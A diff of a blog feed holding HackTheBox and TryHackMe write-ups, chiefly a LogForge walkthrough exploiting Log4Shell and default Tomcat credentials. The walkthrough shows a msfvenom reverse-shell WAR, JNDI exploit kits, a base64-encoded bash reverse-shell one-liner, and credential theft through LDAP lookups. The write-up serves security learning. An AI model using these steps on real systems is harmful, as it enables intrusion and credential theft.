+&lt;img src=&quot;/assets/images/img-solar/captura47.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now if we perform the same attack again to access in the system, we see that we do not have any connection from the victim machine. because now it’s disable the jndi lookups which means the victima machine can’t connect our ldap referral server.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura48.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;task-10---patching&quot;&gt;Task 10 - Patching&lt;/h2&gt;
+
+&lt;p&gt;And finally, it tells us that there are still no patches for this vulnerability (log4shell) and it’s recommended to update the log4j packages to the new version that it’s not include the jndi.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura49.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And with this we finish the room, and we already know how this vulnerability works and how critical it is.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-solar/captura50.png&quot; /&gt;
+&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Tryhackme" /><category term="Linux" /><category term="CVE" /><category term="RCE" /><summary type="html">Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.</summary></entry><entry><title type="html">HTB - LogForge</title><link href="http://localhost:4000/htb-logforge/" rel="alternate" type="text/html" title="HTB - LogForge" /><published>2022-01-14T00:00:00+01:00</published><updated>2022-01-14T00:00:00+01:00</updated><id>http://localhost:4000/htb-logforge</id><content type="html" xml:base="http://localhost:4000/htb-logforge/">&lt;p&gt;LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the escalation of privileges, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-logforge/portada.png&quot; /&gt;
@@ -195,53 +536,298 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;img src=&quot;/assets/images/img-logforge/captura15.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;!--&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;&lt;p align = &quot;center&quot;&gt;
-&lt;img src = &quot;/assets/images/img-logforge/captura14.png&quot;&gt;
-&lt;/p&gt;--&gt;
+&lt;p&gt;Ok as we don’t have credentials, let’s try the default credentials that come with apache tomcat.&lt;/p&gt;
 
-&lt;p&gt;Not finish&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Hack the box" /><category term="Linux" /><category term="CVE" /><category term="RCE" /><summary type="html">LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the privileges escalation, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.</summary></entry><entry><title type="html">Hak5 - Rubber Ducky</title><link href="http://localhost:4000/hak5-rubberducky/" rel="alternate" type="text/html" title="Hak5 - Rubber Ducky" /><published>2022-01-11T00:00:00+01:00</published><updated>2022-01-11T00:00:00+01:00</updated><id>http://localhost:4000/hak5-rubberducky</id><content type="html" xml:base="http://localhost:4000/hak5-rubberducky/">&lt;p&gt;Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura16.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;In this case one of the default credentials works, which is the user &lt;strong&gt;&lt;em&gt;tomcat&lt;/em&gt;&lt;/strong&gt; and the password &lt;strong&gt;&lt;em&gt;tomcat&lt;/em&gt;&lt;/strong&gt;. And we already have access to the apache tomcat manager page.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura17.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we go down we can see that we can upload a &lt;strong&gt;&lt;em&gt;WAR&lt;/em&gt;&lt;/strong&gt; file, what we can do is try to upload a malicious war file to get access to the victim machine or to dump some credentials. So let’s try.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura18.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So what we are going to do is create a malicious war file with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt;, and in this case the payload we are going to use is &lt;strong&gt;&lt;em&gt;jsp_reverse_shell_tcp&lt;/em&gt;&lt;/strong&gt; to try get a reverse shell.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura19.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now with msfvenom we will specify the payload, our attacker ip and the port we are listening with netcat, we will specify with the parameter &lt;strong&gt;&lt;em&gt;-f&lt;/em&gt;&lt;/strong&gt; the format of the file which in this caso is &lt;strong&gt;&lt;em&gt;war&lt;/em&gt;&lt;/strong&gt; and finally we will put a name for the file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura20.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now with netcat i am going to listen on the port 443.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura21.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now in the website we are going to upload the war file that we generate and see if we received any connection in netcat.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura22.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And we get a message that only 1 bytes war file can be uploaded, and with 1 byte war file we can’t do a shit. And this is where the &lt;strong&gt;&lt;em&gt;log4shell&lt;/em&gt;&lt;/strong&gt; vulnerability comes in.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura23.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;If we search about log4shell it says that is a vulnerability that affects java &lt;strong&gt;&lt;em&gt;JDNI&lt;/em&gt;&lt;/strong&gt;, basically that in the log4j variables that are stored we can inject code with jdni. And btw this vulnerability is registred as &lt;strong&gt;&lt;em&gt;CVE-2021-44228&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura24.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now what we are going to do is to check if the tomcat service has deployed the log4j library, and we will do it with the following sequence shown in the image.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura25.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And what we are going to do is to be listening on the port that we have specified in that variable and the same variable we are going to paste it in a box in the website.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura26.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And if we received a connection on netcat that means that the log4j is deployed on that website or app, whatever.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura27.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So to exploit this vulnerability what we need is a ldap or rmi server that offers us jdni url. for this we are going to clone this &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Exploit&quot;&gt;repo&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/repos.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ok so with this repo we can execute two parameters the first one is &lt;strong&gt;&lt;em&gt;-A&lt;/em&gt;&lt;/strong&gt; to specify our ip address and &lt;strong&gt;&lt;em&gt;-C&lt;/em&gt;&lt;/strong&gt; the command or code that we want to execute in the victim machine, in this case we are going to execute a reverse shell that we will encode in base64, we do this to generate a payload for exec.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura30.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We will then run the following command to launch our ldap and rmi server, we will paste the command or the code that we just encoded and the ip address of our attacker machine. And we are going to listen with netcat on the port we have previously specified (in my case it is the port 9001).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura31.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Ok now what we are going to do is copy and paste one of the urls that has generated us with the previous command (in my case i recommend that you to use last one of rmi that is says &lt;strong&gt;&lt;em&gt;Target environment Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath&lt;/em&gt;&lt;/strong&gt;) and we are gon a paste it in the tomcat page and press enter.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura33.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So as u can see onece we press enter the payload is uploaded on the victim machine with rmi and in netcat we receive the connection, And as u can see we are inside to the victim machine, so thats how we ara exploited the log4shell vulnerability.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura32.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;second-option-to-exploit-the-log4shell&quot;&gt;Second option to exploit the log4shell&lt;/h2&gt;
+
+&lt;p&gt;Another option to exploit the log4j, is first download the &lt;a href=&quot;https://github.com/pimps/JNDI-Exploit-Kit&quot;&gt;JDNI-Exploit-Kit&lt;/a&gt; repo to have a ldap server and also the &lt;a href=&quot;https://github.com/pimps/ysoserial-modified&quot;&gt;ysoserial-modified&lt;/a&gt; repo to create a serialized data (so that our reverse shell command is serialized).&lt;/p&gt;
+
+&lt;p&gt;Now we are going to generate a serialized paylod with tha payload type &lt;strong&gt;&lt;em&gt;commonsCollections5&lt;/em&gt;&lt;/strong&gt; if this does not work we try with the 4.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/null/yourip/port 0&amp;gt;&amp;amp;1'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64
+&lt;/span&gt;YmFzaCAtaSA+JiAvZGV2L251bGwveW91cmlwL3BvcnQgMD4mMQ&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ysoserial-modified.jar CommonsCollections5 bash &lt;span class=&quot;s1&quot;&gt;'echo YmFzaCAtaSA+JiAvZGV2L251bGwveW91cmlwL3BvcnQgMD4mMQ== | base64 -d | bash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.ser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Run the ldap server:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; yourip:1389 &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; payload.ser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we are going to do what we done before, which is to copy a jndi link and paste it in the tomcat page by listening in netcat.&lt;/p&gt;
+
+&lt;h2 id=&quot;analyze-the-system-once-we-have-access&quot;&gt;Analyze the system once we have access&lt;/h2&gt;
+
+&lt;p&gt;The first thing when we have access in the machine is to launch a pseudo console and then &lt;strong&gt;&lt;em&gt;ctrl + z&lt;/em&gt;&lt;/strong&gt; and with the command &lt;strong&gt;&lt;em&gt;stty raw -echo; fg&lt;/em&gt;&lt;/strong&gt; to treat the tty, so that we can use ctrl + c, move comfortably in the remote machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura34.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now we are going to export two environment which is &lt;strong&gt;&lt;em&gt;xterm&lt;/em&gt;&lt;/strong&gt; (to use command like “clear” or to use ctrl + l) and &lt;strong&gt;&lt;em&gt;bash&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura35.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we do &lt;strong&gt;&lt;em&gt;nano&lt;/em&gt;&lt;/strong&gt; we see that the size of remote shell is not correct, this happens because we have not defined the size of the rows and columns on the remote shell.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura36.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So what we’re gon a do is look at the proportions of our attacker shell and copy it.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura37.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now we’re going to apply those same proportions to the remote shell.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura38.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So let’s what users there are in the system, and we can see there are one user with the id 1000 called htb. Let’s try to access the home directory of this user.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura39.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now we can see the first flag which is the &lt;strong&gt;&lt;em&gt;user.txt&lt;/em&gt;&lt;/strong&gt; that we are going to submit in the hackthebox website.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura40.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;After checking the system to escalte privileges, if we look at the processes that are running on the system we can see that there is a process that is running a cron task that is running an ftp service in java, hmm interesting it’s possible that this ftp service is also using log4j and it would be the same exploitation process that we did before with the log4shell.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura41.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Before checking if the ftp service is using the log4j we are going to check if it allows us to access this ftp service, and as you can see we can access, and the user &lt;strong&gt;&lt;em&gt;anonymous&lt;/em&gt;&lt;/strong&gt; user is not enabled.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura42.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So we are going to do same process as we did before to check if there is a log4j running. first we are going to listen with netcat and we are going to inject the same variable when it asks us for the username (it is assumed that this variable can be injected anywhere while is the log4j). And we can see that i have received a connection in netcat.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura43.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Well we already know that the log4j is being used in this ftp service, in this case here it changes a bit in the way to exploit the log4j that we have done before. we have seen in the system processes that there is a &lt;strong&gt;&lt;em&gt;.jar&lt;/em&gt;&lt;/strong&gt; file that for some reason is shared from the system root path. so at this point what we can do is decompile this file with the java decompiler called &lt;strong&gt;&lt;em&gt;JD-GUI&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Decompiler:&lt;/em&gt;&lt;/strong&gt; is a program that performs the reverse operation of a compiler, basically its function is to obtain the source code of a compiled program (in our case the file is compiled in &lt;strong&gt;&lt;em&gt;.jar&lt;/em&gt;&lt;/strong&gt;).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura44.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So what we are going to do is to transfer that file with netcat, and in my case i want it to transfer with the name &lt;strong&gt;&lt;em&gt;ftpserver.jar&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura45.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And with the command &lt;strong&gt;&lt;em&gt;md5sum&lt;/em&gt;&lt;/strong&gt; we will check if the hashes are the same, to check if the file data has not been manipulated when we transfer the file. And in this case we see that it is the same, so perfect.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura46.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now with &lt;strong&gt;&lt;em&gt;jd-gui&lt;/em&gt;&lt;/strong&gt; we are going to see the code of this file, if we don’t have this decompiler installed we do an &lt;strong&gt;&lt;em&gt;apt install jd-gui&lt;/em&gt;&lt;/strong&gt; and we will have it installed.&lt;/p&gt;
+
+&lt;p&gt;And we can see that in the code the log4j library is imported.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura47.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And in the &lt;strong&gt;&lt;em&gt;worker.class&lt;/em&gt;&lt;/strong&gt; file we can see that the ftp username and password are stored in the environment variables &lt;strong&gt;&lt;em&gt;ftp_user&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;ftp_password&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura48.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So with the user we have access to on the victim machine we do not see those two environment variables.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura49.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And if we try to search for it with the command &lt;strong&gt;&lt;em&gt;echo&lt;/em&gt;&lt;/strong&gt; we see nothing and that is because the root user is running the ftp service and in the root environment variable those two environment variables will be defined.&lt;/p&gt;
+
+&lt;p&gt;Then as we have done before to check if it was running the log4j in the ftp service, we can take advantage of that to perform a data exfiltration by ldap or rmi using a ldap server as we have done before, we can take advantage of the jdni injection to link the information between these two environment variables via wireshark.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura50.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;In a real environment for example we can use canary tokens that behaves as a kind of public ldap server, instead of doing it in our own machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura51.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And instead of &lt;strong&gt;&lt;em&gt;hostname&lt;/em&gt;&lt;/strong&gt; we put the environment variable &lt;strong&gt;&lt;em&gt;ftp_user&lt;/em&gt;&lt;/strong&gt;, and in canary tokens it will receive the logs and from there we could see the user name, but as the hackthebox machine has no internet then we can’t do it.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura52.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;At this point what we ara going to do is an a another window run the ldap server as we have done before to exploit the log4shell, and when it asks for the username in the ftp service we are going to inject the jdni url and we will add the env variable (&lt;strong&gt;&lt;em&gt;$env:ftp_user&lt;/em&gt;&lt;/strong&gt;) because this env variable exists in the root user’s env and that env variable stored the username. But the problem is that we can’t see the information from our ldap server, what we are going to do is to capture those packets in wireshark.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura53.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And once we hit enter, we capture the packets in wireshrak and in this case i am going to filter the port 1389 (ldap), and in this i have captured a packet and we see tha username.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura54.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We do the same process with the &lt;strong&gt;&lt;em&gt;ftp_password&lt;/em&gt;&lt;/strong&gt; variable.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura55.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And if we capture those packets in wireshark by filtering the port 1389 we can see the user’s password.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura56.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now once we have the credentials let’s check if we have access, and as you can see we have access and we can visualize the last flag which is the &lt;strong&gt;&lt;em&gt;root.txt&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura57.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Get the &lt;strong&gt;&lt;em&gt;root.txt&lt;/em&gt;&lt;/strong&gt; and uploaded in the hackthebox website.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura58.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We can see an interesting directory that is shared in this ftp service, which is the &lt;strong&gt;&lt;em&gt;.ssh&lt;/em&gt;&lt;/strong&gt; and inside we can see the &lt;strong&gt;&lt;em&gt;id_rsa&lt;/em&gt;&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura59.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;We download the &lt;strong&gt;&lt;em&gt;id_rsa&lt;/em&gt;&lt;/strong&gt; file and we get the ssh private key, which we can use to access as the root user with ssh.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-logforge/captura60.png&quot; /&gt;
+&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Hack the box" /><category term="Linux" /><category term="CVE" /><category term="RCE" /><summary type="html">LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the privileges escalation, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.</summary></entry><entry><title type="html">Hak5 - Rubber Ducky</title><link href="http://localhost:4000/hak5-rubberducky/" rel="alternate" type="text/html" title="Hak5 - Rubber Ducky" /><published>2022-01-11T00:00:00+01:00</published><updated>2022-01-11T00:00:00+01:00</updated><id>http://localhost:4000/hak5-rubberducky</id><content type="html" xml:base="http://localhost:4000/hak5-rubberducky/">&lt;p&gt;Rubber ducky by hak5 is a usb that simulates a keyboard that as soon as it is connected to a computer starts to write or perform the payload that we have indicated in a super fast way, in this article we will create some payloads and attacks that we can done and how to mitigate these types of attacks.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-rubberd/portada1.jpg&quot; /&gt;
@@ -3209,365 +3795,4 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 &lt;img src=&quot;/assets/images/img-netcat/captura27.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;In conclusion we have been able to learn how attackers can access our systems in an easier way. and it is also important to know how to use netcat if we are system administrators or are auditing a company and also these techniques are needed to know if we are doing ctf’s in hack the box, tryhackme.&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="netcat" /><category term="Linux" /><category term="reverse shell" /><summary type="html">We are going to learn how we can reverse shell in every OS, and some netcat commands that can help us when we are pentesting or scanning our environment.</summary></entry><entry><title type="html">Scanning network with nmap</title><link href="http://localhost:4000/nmap-guide/" rel="alternate" type="text/html" title="Scanning network with nmap" /><published>2021-11-09T00:00:00+01:00</published><updated>2021-11-09T00:00:00+01:00</updated><id>http://localhost:4000/nmap-guide</id><content type="html" xml:base="http://localhost:4000/nmap-guide/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-nmap/nmap.jpg&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;We are going to learn how to scan a network or a host using nmap, we are going to see some simple nmap commands and commands that help us to pentest, and we are going to use some nmap scripts to speed up the scanning process.&lt;/p&gt;
-
-&lt;p&gt;We are going to cover:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;What is nmap&lt;/li&gt;
-  &lt;li&gt;Basics commands and parameters with nmap&lt;/li&gt;
-  &lt;li&gt;Difference between TCP connect scan and SYN scan&lt;/li&gt;
-  &lt;li&gt;Nmap script&lt;/li&gt;
-  &lt;li&gt;Useful set of parameters&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;what-is-nmap&quot;&gt;What is nmap?&lt;/h2&gt;
-
-&lt;p&gt;Nmap is a very powerful tool that allows us to scan networks and hots to detect possible ports that are open or vulnerable, and also this tool will be very helpful if we are learning pentest or if you want become a hacker. we can use nmap in windows, mac and linux in my case i going to use in linux, but the commands it’s the same in others OS.&lt;/p&gt;
-
-&lt;h2 id=&quot;basics-commands-and-parameters-with-nmap&quot;&gt;Basics commands and parameters with nmap&lt;/h2&gt;
-
